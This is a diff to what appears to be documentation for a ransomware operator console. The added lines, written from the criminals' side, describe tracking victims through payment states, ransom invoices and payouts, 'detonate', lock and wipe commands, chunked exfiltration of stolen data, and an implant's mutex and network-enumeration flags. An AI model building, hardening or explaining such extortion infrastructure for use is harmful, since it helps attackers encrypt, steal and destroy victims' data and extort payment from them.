@@ -316,6 +316,23 @@ Operator console:
   separate 16-digit step-up password (PBKDF2 hash in the `stepup_pass_hash`
   setting), not TOTP enrollment. The unlock lasts 5 minutes and is bound to
   IP + user-agent.
+- **Business-state hardening**: every paid transition clears `detonate` and
+  `pardon`, `api_ping` sleeps for paid/pardoned victims even with a stale arm
+  flag, and paid/pardoned/dead victims reject detonate, kill, and lock/wipe
+  commands. Manual "mark paid" books the remaining quote and closes the invoice;
+  root release voids the invoice without revenue; refunds below the invoice
+  revert the victim to `negotiating`. Payout balances reserve `requested` and
+  `approved`, reject over-requests transactionally, and enforce transitions.
+  Campaign tokens are accepted by `/api/*` and tag the victim's `campaign_id`;
+  nuked campaigns cannot be recompiled. Proof uploads only consume a retry after
+  a successful decrypt; exfil v1 requires `xfer` for multi-chunk uploads and
+  refuses incomplete assemblies; housekeeping is serialized; duplicate manual
+  txids return a flash instead of 500; victim delete purges operational files
+  while preserving the money ledger.
+- **Harness isolation**: `--safe`, `--persist-preview`, `--selftest`,
+  `--shares`, and `--net-enum` bypass the implant single-instance mutex; the
+  mutex check resets `LastError` before `CreateMutexW` so a stale startup error
+  cannot fake a second instance.
 - **CSRF on every POST** (`SameSite=Lax` + per-session token), destructive
   actions are **POST-only** (`GET /admin/detonate/...` → 405).
 - **Accounts**: pbkdf2 200k, roles admin/viewer, **TOTP + single-use backup
